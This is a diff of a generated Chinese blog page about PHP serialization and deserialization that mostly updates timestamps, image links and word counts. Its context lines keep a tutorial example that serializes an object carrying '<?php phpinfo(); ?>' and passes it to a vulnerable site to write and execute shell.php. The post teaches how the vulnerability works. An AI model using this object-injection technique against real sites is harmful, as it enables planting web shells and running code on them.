@@ -126,8 +126,8 @@
 <meta property="og:image" content="https://i.imgur.com/pa1NdhQ.png">
 <meta property="og:image" content="https://i.imgur.com/9i2jEZt.png">
 <meta property="og:image" content="https://i.imgur.com/an5GXdp.png">
-<meta property="og:image" content="https://i.imgur.com/Ykl6AT1.png">
-<meta property="og:updated_time" content="2018-11-04T14:46:04.635Z">
+<meta property="og:image" content="https://i.imgur.com/MGzmFmO.png">
+<meta property="og:updated_time" content="2018-11-04T14:52:24.806Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="序列化和反序列化">
 <meta name="twitter:description" content="什么是序列化&amp;amp;反序列化 序列化： 序列化是将变量转换为可保存或传输的字符串的过程。  反序列化：将在序列化过程中所生成的字符串再转化成原来的变量使用。   PHP序列化的方法 PHP最初通过内置的serialize()和unserialize()函数来实现序列化。serialize()的参数可以是resource类型外的所有变量类型，最常见的是用来序列化对象，unseialize()将se">
@@ -393,7 +393,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2018-11-04T22:46:04+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2018-11-04T22:52:24+08:00">
                 2018-11-04
               </time>
             
@@ -426,7 +426,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1,269 字
+                  1,273 字
                 </span>
               
 
@@ -531,7 +531,7 @@
 <p>PHP脚本如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $value = <span class="string">'123'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> test;</span><br><span class="line">$obj-&gt;value = <span class="string">"&lt;?php phpinfo(); ?&gt;"</span>;</span><br><span class="line">$temp = serialize($obj);</span><br><span class="line">print_r($temp);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>运行后得到<br><code>O:4:&quot;test&quot;:1:{s:5:&quot;value&quot;;s:19:&quot;&lt;?php phpinfo(); ?&gt;&quot;;}</code></p>
 <p>将其传入漏洞站点<br><img src="https://i.imgur.com/an5GXdp.png" alt=""></p>
-<p>再打开shell.php发现成功写入<code>&lt;?php phpinfo(); ?&gt;</code><br><img src="https://i.imgur.com/Ykl6AT1.png" alt=""></p>
+<p>打开shell.php发现成功写入<code>&lt;?php phpinfo(); ?&gt;</code> 并解析成功<br><img src="https://i.imgur.com/MGzmFmO.png" alt=""></p>
 <hr>
 
       
@@ -880,7 +880,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">23.9k</span>
+    <span title="Site words total count">24.0k</span>
   
 </div>
 
